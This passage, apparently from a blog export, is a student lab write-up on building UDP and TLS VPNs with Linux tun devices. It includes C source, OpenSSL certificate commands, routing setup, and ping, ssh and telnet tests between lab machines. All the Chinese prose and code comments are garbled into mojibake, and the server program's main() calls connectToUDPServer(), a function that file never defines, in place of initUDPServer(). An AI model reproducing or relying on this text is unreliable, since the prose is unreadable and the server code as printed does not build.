&amp;readFDSet, NULL, NULL, NULL); // ç›‘å¬ä¸¤ä¸ªç«¯å£ é˜»å¡è¿›ç¨‹ï¼ŒçŸ¥é“æœ‰ä¸€ä¸ªç«¯å£æ”¶åˆ°æ•°æ® // å½“æ”¶åˆ°æ•°æ®ç¨‹åºç»§ç»­æ‰§è¡Œ å¯¹æ•°æ®è¿›è¡Œè½¬å‘ if (FD_ISSET(tunfd, &amp;readFDSet)) // å½“tunçš„æ–‡ä»¶fdå¯ä»¥è¯»å†™ tunSelected(tunfd, sockfd); if (FD_ISSET(sockfd, &amp;readFDSet)) // å½“socketçš„æ–‡ä»¶fdå¯ä»¥è¯»å†™ socketSelected(tunfd, sockfd); &#125; &#125; å®Œæ•´ä»£ç VPN server #include &lt;fcntl.h&gt; #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;arpa/inet.h&gt; #include &lt;linux/if.h&gt; #include &lt;linux/if_tun.h&gt; #include &lt;sys/ioctl.h&gt; #define PORT_NUMBER 55555 #define BUFF_SIZE 2000 struct sockaddr_in peerAddr; int createTunDevice() &#123; // åˆ›å»º tun0 ç½‘å¡ int tunfd; struct ifreq ifr; memset(&amp;ifr, 0, sizeof(ifr)); ifr.ifr_flags = IFF_TUN | IFF_NO_PI; // tunè®¾å¤‡ä¸åŒ…å«ä»¥å¤ªç½‘å¤´éƒ¨ tunfd = open(&quot;/dev/net/tun&quot;, O_RDWR); // æ‰“å¼€æ–‡ä»¶ ioctl(tunfd, TUNSETIFF, &amp;ifr); // æ‰“å¼€è®¾å¤‡ return tunfd; // è¯¥å‡½æ•°æ‰§è¡Œå®Œå æ‰§è¡Œå‘½ä»¤ifconfig tunX 192.168.53.5/24 up ä¸ºtunç½‘å¡è®¾ç½®IPå¹¶å¼€å¯ &#125; int initUDPServer() &#123; int sockfd; struct sockaddr_in server; char buff[100]; memset(&amp;server, 0, sizeof(server)); server.sin_family = AF_INET; // æœåŠ¡å™¨åœ°å€ç±»å‹ä¸ºIPV4 server.sin_addr.s_addr = htonl(INADDR_ANY); //æœåŠ¡å™¨IP server.sin_port = htons(PORT_NUMBER); // ç«¯å£å· sockfd = socket(AF_INET, SOCK_DGRAM, 0); //åˆ›å»ºUDPçš„å¥—æ¥å­— bind(sockfd, (struct sockaddr*) &amp;server, sizeof(server)); // socketç»‘å®šåœ°å€å’Œç«¯å£ // ç­‰å¾…è¿æ¥ bzero(buff, 100); //æ¸…ç©ºç¼“å†²åŒº int peerAddrLen = sizeof(struct sockaddr_in); //åˆå§‹åŒ–ç»“æ„ä½“ int len = recvfrom(sockfd, buff, 100, 0,(struct sockaddr *) &amp;peerAddr, &amp;peerAddrLen); // ç­‰å¾…æ¥æ”¶æ•°æ® printf(&quot;Connected with the client: %s\\n&quot;, buff); return sockfd; &#125; void tunSelected(int tunfd, int sockfd)&#123; int len; char buff[BUFF_SIZE]; //å®šä¹‰æ¥æ”¶æ•°çš„ç¼“å†²åŒº printf(&quot;Got a packet from TUN\\n&quot;); bzero(buff, BUFF_SIZE); // æ¸…ç©ºç¼“å†²åŒº len = read(tunfd, buff, BUFF_SIZE); // è¯»å–æ¥è‡ªtun0ç½‘å¡çš„æ•°æ®ï¼Œä¿å­˜åœ¨ç¼“å†²åŒºä¸­ sendto(sockfd, buff, len, 0, (struct sockaddr *) &amp;peerAddr, sizeof(peerAddr)); // é€šè¿‡socketå‘é€æ•°æ® &#125; void socketSelected (int tunfd, int sockfd)&#123; int len; char buff[BUFF_SIZE]; printf(&quot;Got a packet from the tunnel\\n&quot;); bzero(buff, BUFF_SIZE); len = recvfrom(sockfd, buff, BUFF_SIZE, 0, NULL, NULL); // æ¥æ”¶æ•°æ®è‡³buffï¼Œä¿å­˜æ•°æ®çš„é•¿åº¦ write(tunfd, buff, len); // é€šè¿‡writeå‘é€åˆ°tun0 &#125; int main (int argc, char * argv[]) &#123; int tunfd, sockfd; tunfd = createTunDevice(); // åˆ›å»ºtun0ç½‘å¡ sockfd = connectToUDPServer(); // å»ºç«‹socketè¿æ¥ // è¿›å…¥ä¸»å¾ªç¯ while (1) &#123; fd_set readFDSet; FD_ZERO(&amp;readFDSet); // å°†setæ¸…é›¶ä½¿é›†åˆä¸­ä¸å«ä»»ä½•fd FD_SET(sockfd, &amp;readFDSet); // å°†socketfdåŠ å…¥seté›†åˆ FD_SET(tunfd, &amp;readFDSet); // å°†tunfdåŠ å…¥seté›†åˆ select(FD_SETSIZE, &amp;readFDSet, NULL, NULL, NULL); // ç›‘å¬ä¸¤ä¸ªç«¯å£ é˜»å¡è¿›ç¨‹ï¼ŒçŸ¥é“æœ‰ä¸€ä¸ªç«¯å£æ”¶åˆ°æ•°æ® // å½“æ”¶åˆ°æ•°æ®ç¨‹åºç»§ç»­æ‰§è¡Œ å¯¹æ•°æ®è¿›è¡Œè½¬å‘ if (FD_ISSET(tunfd, &amp;readFDSet)) // å½“tunçš„æ–‡ä»¶fdå¯ä»¥è¯»å†™ tunSelected(tunfd, sockfd); if (FD_ISSET(sockfd, &amp;readFDSet)) // å½“socketçš„æ–‡ä»¶fdå¯ä»¥è¯»å†™ socketSelected(tunfd, sockfd); &#125; &#125; VPN client #include &lt;fcntl.h&gt; #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;arpa/inet.h&gt; #include &lt;linux/if.h&gt; #include &lt;linux/if_tun.h&gt; #include &lt;sys/ioctl.h&gt; #define BUFF_SIZE 2000 #define PORT_NUMBER 55555 #define SERVER_IP &quot;10.0.2.8&quot; // VPN æœåŠ¡å™¨ip struct sockaddr_in peerAddr; int createTunDevice() &#123; // åˆ›å»º tun0 ç½‘å¡ int tunfd; struct ifreq ifr; memset(&amp;ifr, 0, sizeof(ifr)); ifr.ifr_flags = IFF_TUN | IFF_NO_PI; // tunè®¾å¤‡ä¸åŒ…å«ä»¥å¤ªç½‘å¤´éƒ¨ tunfd = open(&quot;/dev/net/tun&quot;, O_RDWR); // æ‰“å¼€æ–‡ä»¶ ioctl(tunfd, TUNSETIFF, &amp;ifr); // æ‰“å¼€è®¾å¤‡ return tunfd; // è¯¥å‡½æ•°æ‰§è¡Œå®Œå æ‰§è¡Œå‘½ä»¤ifconfig tunX 192.168.53.5/24 up ä¸ºtunç½‘å¡è®¾ç½®IPå¹¶å¼€å¯ &#125; int connectToUDPServer()&#123; //åˆ›å»ºsocketè¿æ¥ è¿æ¥åˆ°vpnæœåŠ¡å™¨ int sockfd; char *hello=&quot;Hello&quot;; //æŒ‡å®šæœåŠ¡å™¨çš„åœ°å€ç»“æ„ memset(&amp;peerAddr, 0, sizeof(peerAddr)); peerAddr.sin_family = AF_INET; // æœåŠ¡å™¨åœ°å€ç±»å‹ä¸ºIPV4 peerAddr.sin_port = htons(PORT_NUMBER); peerAddr.sin_addr.s_addr = inet_addr(SERVER_IP); sockfd = socket(AF_INET, SOCK_DGRAM, 0); sendto(sockfd, hello, strlen(hello), 0, // è¿æ¥æœåŠ¡å™¨åå‘é€ä¸€ä¸ªæ¶ˆæ¯ hello (struct sockaddr *) &amp;peerAddr, sizeof(peerAddr)); return sockfd; &#125; void tunSelected(int tunfd, int sockfd)&#123; int len; char buff[BUFF_SIZE]; //å®šä¹‰æ¥æ”¶æ•°çš„ç¼“å†²åŒº printf(&quot;Got a packet from TUN\\n&quot;); bzero(buff, BUFF_SIZE); // æ¸…ç©ºç¼“å†²åŒº len = read(tunfd, buff, BUFF_SIZE); // è¯»å–æ¥è‡ªtun0ç½‘å¡çš„æ•°æ®ï¼Œä¿å­˜åœ¨ç¼“å†²åŒºä¸­ sendto(sockfd, buff, len, 0, (struct sockaddr *) &amp;peerAddr, sizeof(peerAddr)); // é€šè¿‡socketå‘é€æ•°æ® &#125; void socketSelected (int tunfd, int sockfd)&#123; int len; char buff[BUFF_SIZE]; printf(&quot;Got a packet from the tunnel\\n&quot;); bzero(buff, BUFF_SIZE); len = recvfrom(sockfd, buff, BUFF_SIZE, 0, NULL, NULL); // æ¥æ”¶æ•°æ®è‡³buffï¼Œä¿å­˜æ•°æ®çš„é•¿åº¦ write(tunfd, buff, len); // é€šè¿‡writeå‘é€åˆ°tun0 &#125; int main (int argc, char * argv[]) &#123; int tunfd, sockfd; tunfd = createTunDevice(); // åˆ›å»ºtun0ç½‘å¡ sockfd = connectToUDPServer(); // å»ºç«‹socketè¿æ¥ // è¿›å…¥ä¸»å¾ªç¯ while (1) &#123; fd_set readFDSet; FD_ZERO(&amp;readFDSet); // å°†setæ¸…é›¶ä½¿é›†åˆä¸­ä¸å«ä»»ä½•fd FD_SET(sockfd, &amp;readFDSet); // å°†socketfdåŠ å…¥seté›†åˆ FD_SET(tunfd, &amp;readFDSet); // å°†tunfdåŠ å…¥seté›†åˆ select(FD_SETSIZE, &amp;readFDSet, NULL, NULL, NULL); // ç›‘å¬ä¸¤ä¸ªç«¯å£ é˜»å¡è¿›ç¨‹ï¼ŒçŸ¥é“æœ‰ä¸€ä¸ªç«¯å£æ”¶åˆ°æ•°æ® // å½“æ”¶åˆ°æ•°æ®ç¨‹åºç»§ç»­æ‰§è¡Œ å¯¹æ•°æ®è¿›è¡Œè½¬å‘ if (FD_ISSET(tunfd, &amp;readFDSet)) // å½“tunçš„æ–‡ä»¶fdå¯ä»¥è¯»å†™ tunSelected(tunfd, sockfd); if (FD_ISSET(sockfd, &amp;readFDSet)) // å½“socketçš„æ–‡ä»¶fdå¯ä»¥è¯»å†™ socketSelected(tunfd, sockfd); &#125; &#125; å®éªŒç¯å¢ƒ å®éªŒè£…ç½® æ‹“æ‰‘å›¾ ä¸»æœºç‰©ç†ç½‘å¡é…ç½® å®éªŒè£…ç½® host uï¼šubuntu 18.04 VPNserverï¼šubuntu 18.04 host Vï¼šubuntu 18.04 ç½‘ç»œæ‹“æ‰‘å›¾ æœ¬æ¬¡å®éªŒéœ€è¦ä¸‰å°ä¸»æœºï¼Œåˆ†åˆ«ä½œä¸ºhost U(VPN ç”¨æˆ·)ï¼ŒVPNæœåŠ¡, host V(å†…ç½‘ä¸»æœº)ã€‚ host Vå¤„äº192.168.60.0/24ç½‘æ®µï¼Œå±äºå†…ç½‘ã€‚ host Uå¤„äº10.0.2.0/24ç½‘æ®µï¼Œå±äºå¤–ç½‘ï¼Œhost V å’Œ host Uåœ¨æ²¡æœ‰VPNçš„æƒ…å†µä¸‹æ— æ³•é€šä¿¡ã€‚ VPN serveræœ‰ä¸¤å¼ ç½‘å¡ï¼Œä¸€å¼ ç½‘å¡çš„IPåœ°å€ä¸º192.168.60.1å¤„äº192.168.60.0/24ç½‘æ®µï¼Œä½œä¸ºhost Vçš„ç½‘å…³ï¼Œå¹¶å¯ä»¥ä¸å…¶é€šä¿¡ï¼›è€Œå¦ä¸€å¼ ç½‘å¡åœ°å€ä¸º10.0.2.8å±äºå¤–ç½‘ç½‘æ®µï¼Œå¯ä»¥ä¸host Ué€šä¿¡ï¼ŒåŒæ—¶å…¶ä½œä¸ºhost Uçš„VPNæœåŠ¡å™¨ï¼Œå®ç°ä¸host Vé€šä¿¡ã€‚ ä¸»æœºç‰©ç†ç½‘å¡é…ç½® ä¸»æœº è§’è‰² IPåœ°å€ å®¢æˆ·æœº VPNå®¢æˆ·æœº/host U 10.0.2.7/24 æœåŠ¡å™¨ VPNæœåŠ¡å™¨/ç½‘å…³ 10.0.2.8/24192.168.60.1/24 å†…ç½‘ä¸»æœº host V 192.168.60.101/24 tun0 è™šæ‹Ÿç½‘å¡é…ç½® ä¸»æœº è™šæ‹Ÿæ¥å£ IPåœ°å€ æœåŠ¡å™¨ tun0 192.168.53.1/24 å®¢æˆ·æœº tun0 192.168.53.5/24 ç¯å¢ƒæ­å»ºè¿è¡Œäº†ä¸‰å°ubuntuçš„è™šæ‹Ÿæœºï¼Œå…³ç³»å¦‚ä¸Šé¢æè¿° æœåŠ¡å™¨ä¸»æœºæœåŠ¡å™¨ä¸»æœºéœ€è¦ä¸¤å—ç½‘å¡ï¼Œè¿™é‡Œé€šè¿‡VMå†æ·»åŠ ä¸€å—ç½‘å¡å³å¯ï¼Œé…ç½®å¦‚å›¾ è¿è¡Œvpnserverç¨‹åºï¼Œè¿è¡Œåä¼šå‡ºç°ä¸€ä¸ªtun0ç½‘å¡ ä½¿ç”¨å‘½ä»¤é…ç½®tun0 ifconfig tun0 192.168.53.1/24 up ç”±äº VPN Server éœ€è¦åœ¨ç§ç½‘å’Œéš§é“ä¹‹é—´è½¬å‘æ•°æ®åŒ…ï¼Œå› æ­¤å®ƒä¹Ÿéœ€è¦å……å½“ç½‘å…³ï¼Œè¿™æ˜¯é€šè¿‡åœ¨ VPN Server ä¸Šå¯ç”¨ IP è½¬å‘æ¥å®ç°çš„ã€‚ sysctl net.ipv4.ip_forward=1 host vå®¢æˆ·ç«¯è¿è¡Œ./vpnclientï¼Œä¹‹åä¼šå‡ºç°ä¸€ä¸ªtun0æ¥å£ï¼Œç„¶åå¯¹å…¶é…ç½® ifconfig tun0 192.168.53.5/24 up é…ç½®è·¯ç”±ç»è¿‡ä»¥ä¸Šä¸¤æ­¥ï¼Œéš§é“å°±å»ºç«‹èµ·æ¥äº†ï¼Œç„¶åæˆ‘ä»¬è®¾ç½®è·¯ç”±è·¯å¾„ä»¥å°†é¢„æœŸæµé‡å¼•å¯¼åˆ°å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨æœºå™¨ä¸Šçš„éš§é“ã€‚åœ¨ host vä¸Šï¼Œæˆ‘ä»¬å°†æ‰€æœ‰è¿›å…¥ä¸“ç”¨ç½‘ç»œ (192.168.60.0/24) çš„æ•°æ®åŒ…å®šå‘åˆ° tun0 æ¥å£ï¼Œæ•°æ®åŒ…å°†ä»è¯¥æ¥å£é€šè¿‡ VPN éš§é“è½¬å‘ã€‚æˆ‘ä»¬ä½¿ç”¨ route å‘½ä»¤åœ¨ host v ä¸Šæ·»åŠ ä»¥ä¸‹è·¯ç”±æ¡ç›®ï¼š route add -net 192.168.60.0/24 tun0 åœ¨æœåŠ¡å™¨ä¸»æœºä¸Šï¼Œå°†æµå‘ 192.168.53.0/24 ç½‘ç»œçš„æµé‡å®šå‘åˆ° tun0 æ¥å£ å†…ç½‘ä¸»æœºä¸Šä¸ºäº†é€šè¿‡ VPN éš§é“å°† Host V ï¼ˆå†…ç½‘ä¸»æœºï¼‰å›å¤å‘é€åˆ° Host Uï¼Œæˆ‘ä»¬åœ¨ Host V ä¸Šæ·»åŠ äº†ä¸€ä¸ªè·¯ç”±æ¡ç›®ï¼Œå®ƒå°†å»å¾€ Host U ç½‘ç»œçš„æ•°æ®åŒ…è·¯ç”±åˆ° VPN Serveã€‚ä» VPN Serverï¼Œè¿™ä¸ªæ•°æ®åŒ…å°†é€šè¿‡ VPN éš§é“åˆ°è¾¾ VPN Clientï¼Œæœ€ç»ˆåˆ°è¾¾ Host Uã€‚ ä¸‹é¢æ˜¾ç¤ºäº† Host V ä¸Šçš„è·¯ç”±æ¡ç›® route add -net 192.168.53.0/24 gw 192.168.60.1 ens33 éªŒè¯é€šä¿¡ping æµ‹è¯•cliet ping å†…ç½‘ä¸»æœº å†…ç½‘ä¸»æœºping client å†…ç½‘ä¸»æœºè¿½è¸ªè·¯ç”±ï¼Œå¯ä»¥çœ‹åˆ°ç»è¿‡ç½‘å…³192.168.60.1åˆ°è¾¾äº†ç›®çš„åœ°å€ æŸ¥çœ‹vpnclientå’Œvpnserverç¨‹åºçš„è¿è¡Œæƒ…å†µ VPN client åœ¨å‘é€ ping è¯·æ±‚æ—¶ï¼Œvpnclientåæ˜ å·²æ”¶åˆ° TUN æ¥å£ä¸Šçš„æ•°æ®åŒ…ï¼ˆping è¯·æ±‚ï¼‰å¹¶è¿ç»­æ”¶åˆ°éš§é“ä¸­çš„åŒ…ï¼ˆping å›å¤ï¼‰ VPN server åœ¨ vpnserverä¸Šï¼Œç¨‹åºåæ˜ ä»éš§é“æ¥æ”¶æ•°æ®åŒ…ï¼ˆping è¯·æ±‚ï¼‰ï¼Œç„¶åä» TUN æ¥æ”¶æ•°æ®åŒ…ï¼ˆping å›å¤ï¼‰ sshæµ‹è¯•åœ¨host Væ‰§è¡Œ ssh root@192.168.60.101 åœ¨ host Uä¸Šæ‰§è¡Œ ssh root@10.0.2.7 é€šè¿‡ä¸Šé¢çš„æµ‹è¯•å¯ä»¥ç¡®å®šä¸¤å°ä¸»æœºå¯ä»¥é€šè¿‡VPNç¨‹åºè¿›è¡Œè¿œç¨‹æ§åˆ¶ã€‚ äºŒã€TSL VPNæœ‰äº†ä¸Šé¢åŸºäºTCPçš„VPNï¼Œå†åšTSLå°±ä¼šç®€å•å¾ˆå¤šã€‚ ç¨‹åºå®ç°sslåˆå§‹åŒ–åˆ›å»ºSSLæ•°æ®ç»“æ„ï¼Œç”¨äºå»ºç«‹TLSè¿æ¥ VPN server SSL* SSLLibInit() &#123; SSL_METHOD *meth; SSL_CTX* ctx; SSL *ssl; int err; // OpenSSL åˆå§‹åŒ– SSL_library_init(); SSL_load_error_strings(); SSLeay_add_ssl_algorithms(); // SSL åˆå§‹åŒ– meth = (SSL_METHOD *)TLSv1_2_method(); ctx = SSL_CTX_new(meth); SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL); // åŠ è½½æœåŠ¡å™¨è¯ä¹¦å’Œç§é’¥æ–‡ä»¶ SSL_CTX_use_certificate_file(ctx, &quot;./cert_server/server.pem&quot;, SSL_FILETYPE_PEM); SSL_CTX_use_PrivateKey_file(ctx, &quot;./cert_server/server-key.pem&quot;, SSL_FILETYPE_PEM); ssl = SSL_new (ctx); return ssl; &#125; VPN client SSL* setupTLSClient(const char* hostname) &#123; // OpenSSL åˆå§‹åŒ– SSL_library_init(); SSL_load_error_strings(); SSLeay_add_ssl_algorithms(); SSL_METHOD *meth; SSL_CTX* ctx; SSL* ssl; meth = (SSL_METHOD *)TLSv1_2_method(); ctx = SSL_CTX_new(meth); SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, verify_callback); //æŒ‡æ˜æ˜¯å¦è¦æ±‚æä¾›è¯ä¹¦ if (SSL_CTX_load_verify_locations(ctx,NULL, CA_DIR) &lt; 1) &#123; //åŠ è½½å¯ä¿¡CAè¯ä¹¦ï¼Œè¿›è¡Œè¯ä¹¦éªŒè¯ printf(&quot;Error setting the verify locations. \\n&quot;); exit(0); &#125; ssl = SSL_new (ctx); X509_VERIFY_PARAM *vpm = SSL_get0_param(ssl); X509_VERIFY_PARAM_set1_host(vpm, hostname, 0); return ssl; &#125; TCPè¿æ¥TCPè¿æ¥ä¸ä¸Šé¢çš„è¿æ¥ä¸€æ ·ã€‚ TLSæ¡æ‰‹ SSL_set_fd()å°†SSLç»‘å®šåˆ°ä¸€ä¸ªTCPè¿æ¥è°ƒç”¨SSL_connec()å¯åŠ¨ä¸æœåŠ¡å™¨çš„TLSæ¡æ‰‹åè®®) /*----------------TLS initialization ----------------*/ ssl = setupTLSClient(hostname); printf(&quot;TLSClientsetup initialisation is successful\\n&quot;); /*----------------Create a TCP connection ---------------*/ int sockfd = setupTCPClient(hostname, port); printf(&quot;TCPClientsetup is successful\\n&quot;); /*----------------TLS handshake ---------------------*/ SSL_set_fd(ssl, sockfd); //ç»‘å®šTCPè¿æ¥ printf(&quot;SSL_set_fd() is successful\\n&quot;); int err = SSL_connect(ssl); CHK_SSL(err); printf(&quot;SSL connection is successful\\n&quot;); printf(&quot;SSL connection using %s\\n&quot;, SSL_get_cipher(ssl)); æ•°æ®è½¬å‘æ•°æ®è½¬å‘çš„åŸç†ä¸åŸºäºUDP/TCPçš„VPN çš„åŸç† void processRequest(int tunfd, SSL* ssl, int sockfd) &#123; while(1) &#123; fd_set readFDSet; FD_ZERO(&amp;readFDSet); FD_SET(sockfd, &amp;readFDSet); FD_SET(tunfd, &amp;readFDSet); select(FD_SETSIZE, &amp;readFDSet, NULL, NULL, NULL); if (FD_ISSET(tunfd, &amp;readFDSet)) tunSelected(tunfd, sockfd, ssl); if (FD_ISSET(sockfd, &amp;readFDSet)) socketSelected(tunfd, sockfd, ssl); &#125; &#125; å®éªŒç¯å¢ƒç”±äºåœ¨ä¸Šubuntu 18.04ä¸Šè¿è¡Œæ—¶ï¼Œç¨‹åºå‡ºç°é”™è¯¯ï¼Œæ‰€ä»¥ä½¿ç”¨äº†seedLab æä¾›çš„ ubuntu 16.04é‡æ–°æ­å»ºäº†å®éªŒç¯å¢ƒã€‚å„ä¸ªç½‘å¡ä¿¡æ¯ä¸ä¸Šé¢çš„å®éªŒä¸€æ ·ã€‚ host Uï¼šubuntu 16.04 VPNserverï¼šubuntu 16.04 host Vï¼šubuntu 16.04 ä¸»æœºç‰©ç†ç½‘å¡é…ç½® ä¸»æœº è§’è‰² IPåœ°å€ å®¢æˆ·æœº VPNå®¢æˆ·æœº/host U 10.0.2.7/24 æœåŠ¡å™¨ VPNæœåŠ¡å™¨/ç½‘å…³ 10.0.2.8/24192.168.60.1/24 å†…ç½‘ä¸»æœº host V 192.168.60.101/24 è¿é€šæ€§æµ‹è¯•é…ç½®å®Œå„ä¸ªç½‘å¡çš„IPåœ°å€å host U å¯ä»¥ ping é€š VPNserver (10.0.2.0/24) VPN server å¯ä»¥ping é€šä¸¤å°ä¸»æœº host Vå¯ä»¥ping é€šVPNserver (192.168.60.0/24) CAå’Œè¯ä¹¦è®¾ç½®(1)ã€ä¸º CA ç”Ÿæˆä¸€ä¸ªè‡ªç­¾åè¯ä¹¦ï¼Œå®ƒå°†ä½œä¸ºæ ¹è¯ä¹¦ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š openssl req -new -x509 -keyout ca.key -out ca.crt -config openssl.cnf //æ–‡ä»¶ ca.key åŒ…å« CA çš„ç§é’¥ï¼Œè€Œ ca.crt åŒ…å«å…¬é’¥è¯ä¹¦ã€‚ (2)ã€æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä¸ºæœåŠ¡å™¨åˆ›å»ºä¸€ä¸ª RSA å…¬ç§é’¥å¯¹ openssl genrsa -aes128 -out server.key 1024 (3)ã€åˆ›å»ºä¸€ä¸ªåŒ…å«æœåŠ¡å™¨å…¬é’¥çš„è¯ä¹¦ç­¾åè¯·æ±‚ (CSR)ã€‚ CSR å…·æœ‰ä»¥ä¸‹è¯¦ç»†ä¿¡æ¯ï¼ŒæœåŠ¡å™¨çš„é€šç”¨åç§°ä¸º sunzy.comï¼š openssl req -new -key server.key -out server.csr -config openssl.cnf (4)ã€ç„¶åå°†ä¸Šè¿° CSR å‘é€åˆ° CA ä»¥ç”Ÿæˆå¯†é’¥å’Œé€šç”¨åç§°çš„è¯ä¹¦ã€‚ openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt (5)ã€å°†æœåŠ¡å™¨çš„è¯ä¹¦å’Œå¯†é’¥å­˜å‚¨ä¸º pem æ–‡ä»¶ï¼Œè¿™é‡Œæ˜¯ cp server.crt server-cert.pem cp server.key server-key.pem VPN Server ç¨‹åºä½¿ç”¨è¿™äº›æ–‡ä»¶æ¥åŠ è½½è¯ä¹¦å’Œç§é’¥ï¼Œå¦‚ä¸‹æ‰€ç¤º (6)ã€ä½¿ç”¨åç§°ä½œä¸ºä¸»é¢˜å­—æ®µçš„å“ˆå¸Œå­˜å‚¨æœåŠ¡å™¨çš„è¯ä¹¦ã€‚è¿™æ˜¯å› ä¸ºåœ¨æ¥æ”¶æœåŠ¡å™¨çš„è¯ä¹¦æ—¶ï¼ŒTLS ä¼šæ ¹æ®é¢å‘è€…çš„èº«ä»½ä¿¡æ¯ç”Ÿæˆä¸€ä¸ªå“ˆå¸Œå€¼ï¼Œå¹¶ä½¿ç”¨æ­¤å“ˆå¸Œå€¼åœ¨â€œ./certâ€æ–‡ä»¶å¤¹ä¸­æŸ¥æ‰¾é¢å‘è€…çš„è¯ä¹¦ï¼Œå‘½ä»¤å¦‚ä¸‹:(ä»¥ä¸‹å‘½ä»¤åœ¨ca_client æ–‡ä»¶ä¸‹æ‰§è¡Œ) openssl x509 -in ca.crt -noout -subject_hash ln -s ca.crt b4386d70.0 å»ºç«‹TLSé€šä¿¡VPN serveré¦–å…ˆåœ¨VPNæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå°†cç¨‹åºç¼–è¯‘ä¸ºå¯æ‰§è¡Œç¨‹åº gcc -o vpnserver_tls vpnserver_tls.c -lssl -lcrypto -lcrypt æ‰§è¡Œç¼–è¯‘å¥½çš„ç¨‹åºï¼Œæ­¤æ—¶è¯¥ç¨‹åºå¤„äºç›‘å¬çŠ¶æ€ç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥ æ­¤æ—¶è¯¥ç¨‹åºå°†åˆ›å»ºä¸€ä¸ªtun0è™šæ‹Ÿç½‘å¡ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤é…ç½®ç½‘å¡ä¿¡æ¯ sudo ifconfig tun0 192.168.53.1/24 up é…ç½®å®Œåçš„ç½‘å¡ä¿¡æ¯å¦‚å›¾ï¼š ç¼–è¾‘è·¯ç”±è¡¨å¹¶å°†è®¾ç½®ä¸ºè½¬å‘æ¨¡å¼ sudo route add â€“net 192.168.53.0/24 tun0 sudo sysctl net.ipv4.ip_forward=1 VPN clientä¸æœåŠ¡å™¨ä¸Šä¸€æ ·ï¼Œé¦–å…ˆç¼–è¯‘cç¨‹åº gcc -o vpnclient_tls vpnclient_tls.c -lssl -lcrypto æ‰§è¡Œè¯¥ç¨‹åºï¼ˆè¯¥åŸŸåä¸ä¸Šé¢åˆ›å»ºçš„è¯ä¹¦ä¸­çš„é€šç”¨åç§°ä¸€æ ·ï¼‰ sudo ./vpnclient_tls &quot;sunzy.com&quot; 4433 åˆ›å»ºè¿æ¥åï¼ŒæœåŠ¡å™¨ç«¯ç¡®è®¤åï¼Œå¼€å§‹èº«ä»½è®¤è¯ æœåŠ¡å™¨ç«¯æ”¶åˆ°çš„æ¶ˆæ¯å¦‚ä¸‹ æ­¤æ—¶TLSè¿æ¥å·²ç»å»ºç«‹ã€‚ é…ç½®tun0å’Œè·¯ç”±è¡¨ sudo ifconfig tun0 192.168.53.5/24 up sudo route add -net 192.168.60.0/24 Host Vè¦å®ç°å†…å¤–ç½‘ä¸»æœºä¹‹é—´çš„é€šä¿¡ï¼Œè¿˜éœ€è¦åœ¨å†…ç½‘ä¸»æœºä¸Šæ·»åŠ è·¯ç”±è¡¨ä¿¡æ¯ sudo route add -net 192.168.53.0/24 gw 192.168.60.1 enp0s3 VPN serverå’ŒVPN client çš„è¿æ¥ä¿¡æ¯VPN server VPN client é€šä¿¡éªŒè¯ping æµ‹è¯• å®¢æˆ·ç«¯ï¼ˆ10.0.2.7ï¼‰ping å†…ç½‘ä¸»æœºï¼ˆ192.168.60.101ï¼‰ å†…ç½‘ä¸»æœº(192.168.60.101) ping 10.0.2.7 æŸ¥çœ‹å®¢æˆ·ç«¯ä¸Šçš„ Wireshark æ•°æ®æ—¶ï¼Œæˆ‘ä»¬çœ‹åˆ° ping è¯·æ±‚ä» tun0 å‘é€åˆ°å†…éƒ¨ç½‘ç»œ IPï¼Œå¹¶ä¸”æ­¤æ•°æ®åŒ…ä» VPN å®¢æˆ·ç«¯å‘é€åˆ° VPN tunnel åœ¨æœåŠ¡å™¨ç«¯ï¼Œæˆ‘ä»¬çœ‹åˆ°ç±»ä¼¼çš„æµé‡â€”â€”ä¸»æœº U å’Œä¸»æœº V ä¹‹é—´çš„ ping è¯·æ±‚å’Œå›å¤é€šä¿¡ï¼Œä¸­é—´æœ‰ VPN æœåŠ¡å™¨ã€‚ telnet æµ‹è¯• é¦–å…ˆåœ¨åœ¨Host Uä¸Šä½¿ç”¨telnetæ§åˆ¶Host V åœ¨å†…ç½‘ä¸»æœºHost V ä¸Štelnet å®¢æˆ·ç«¯HostU wiresharkæŠ“å–çš„telnetçš„é€šä¿¡æ•°æ®åŒ… VPN serverä¸Šçš„æ•°æ®åŒ…ä¿¡æ¯ å‘½ä»¤é›†åˆVPN server//ç¼–è¯‘ç¨‹åº gcc -o vpnserver_tls vpnserver_tls.c -lssl -lcrypto -lcrypt //å¯åŠ¨ç¨‹åº sudo ./vpnserver_tls 4433 //è®¾ç½®tun0ä¿¡æ¯ æ·»åŠ è½¬å‘åŠŸèƒ½ æ·»åŠ è·¯ç”± sudo ifconfig tun0 192.168.53.1/24 up sudo sysctl net.ipv4.ip_forward=1 sudo route add -net 192.168.53.0/24 tun0 sudo route add -net 192.168.60.0/24 tun0 VPN client//ç¼–è¯‘ç¨‹åº gcc -o vpnclient_tls vpnclient_tls.c -lssl -lcrypto //å¯åŠ¨ç¨‹åº sudo ./vpnclient_tls sunzy.com 4433 //è®¾ç½®tun0ä¿¡æ¯ æ·»åŠ è·¯ç”± sudo ifconfig tun0 192.168.53.5/24 up sudo route add -net 192.168.60.0/24 å†…ç½‘ä¸»æœºroute add -net 192.168.53.0/24 gw 192.168.60.1 enp0s3","tags":[{"name":"socket","slug":"socket","permalink":"https://sunzhengyu99.github.io/tags/socket/"}]},{"title":"mycms","date":"2021-03-21T07:47:46.000Z","path":"2021/03/21/mycms/","text":"ç½‘ç»œå®‰å…¨ä¸æ”»å‡»å®éªŒè¯¾ç¨‹ä½œä¸š [TOC] è¯¾ç¨‹è¦æ±‚åŸºäº Linux æ“ä½œç³»ç»Ÿï¼ˆå¦‚ Ubuntuï¼‰ï¼Œä½¿ç”¨ Docker å®¹å™¨ï¼Œé€‰æ‹©ä¸€é—¨è‡ªå·±æ“…é•¿çš„è¯­è¨€ï¼ˆåªèƒ½ä» 